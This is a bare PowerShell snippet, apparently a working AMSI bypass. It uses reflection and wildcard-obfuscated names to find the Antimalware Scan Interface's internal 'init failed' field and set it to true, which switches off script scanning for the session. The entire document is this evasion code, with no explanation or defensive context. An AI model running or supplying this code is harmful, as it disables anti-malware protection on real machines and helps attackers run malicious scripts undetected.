$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c = $b}}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {if ($e.Name -like '*Failed') {$f = $e}}
$f.SetValue($null,$true)
